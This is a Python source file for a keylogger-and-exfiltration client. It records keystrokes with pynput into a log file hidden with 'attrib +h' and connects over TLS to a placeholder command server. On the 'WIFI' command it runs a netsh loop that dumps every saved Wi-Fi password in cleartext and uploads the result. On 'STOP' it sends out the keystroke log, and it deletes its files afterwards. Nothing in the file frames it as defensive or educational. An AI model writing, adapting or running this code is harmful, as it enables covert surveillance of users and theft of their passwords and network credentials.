import socket
import ssl
import os
from pynput.keyboard import Key, Listener
import logging
import platform
import threading
import subprocess

CA_CERTIFICATE = """
"""

def save_command_result(output_file):
    command = 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear'
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    output, error = process.communicate()
    if error:
        print("An error occurred:", error)
    else:
        with open(output_file, 'w') as f:
            f.write(output)


def check_platform():
    return platform.system()


def find_ca_cert_path():
    for r, d, files in os.walk("c:\\"):
        for filename in files:
            if filename == "ca-cert.pem":
                path = os.path.join(r, filename)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path
    return None


def os_check():
    current_platform = check_platform()
    if current_platform == 'Windows':
        return 'Windows'
    elif current_platform == 'Linux':
        return 'Linux'
    else:
        return None


def delete_hidden_file(file):
    os.remove(file)


def send_file(conn, filename):
    with open(filename, 'rb') as f:
        while True:
            chunk = f.read(1024)
            if not chunk:
                break
            conn.sendall(chunk)


def key_logger(hidden_file_path, client_ssl, os_local):
    logging.basicConfig(filename=hidden_file_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    if os_local == 'windows':
        os.system(f"attrib +h {hidden_file_path}")
    elif os_local == 'linux':
        hidden_file_path = '.' + hidden_file_path

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))
        server_listener_thread.start()
        server_listener_thread.join()
        listener.stop()
        client_ssl.close()
        logging.shutdown()
        delete_hidden_file(hidden_file_path)
        exit(1)

def listen_to_server(client_ssl):
    while True:
        msg = client_ssl.recv(1024).decode()
        print(f"Server : {msg}")
        if msg == "STOP":
            print("stop")
            send_file(client_ssl, "its_a_trap.txt")
            exit(1)
        if msg == "WIFI":
            output_file = 'result.txt'
            save_command_result(output_file)
            send_file(client_ssl, output_file)
            delete_hidden_file(output_file)


def timeout_handler(client_ssl):
    print("Connection timed out after 10 minutes.")
    client_ssl.close()


def main():
    os_local = os_check()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CA_CERTIFICATE)
    host = 'ip_server'  # Replace with the server IP
    port = 'port'
    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
    client_ssl.connect((host, port))
    print("Client ON")

    while True:
        try:
            key_logger("its_a_trap.txt", client_ssl,os_local)

        except Exception as e:
            print(f"Error: {e}")
            break

        print("-- END --")
        client_ssl.close()


if __name__ == "__main__":
    main()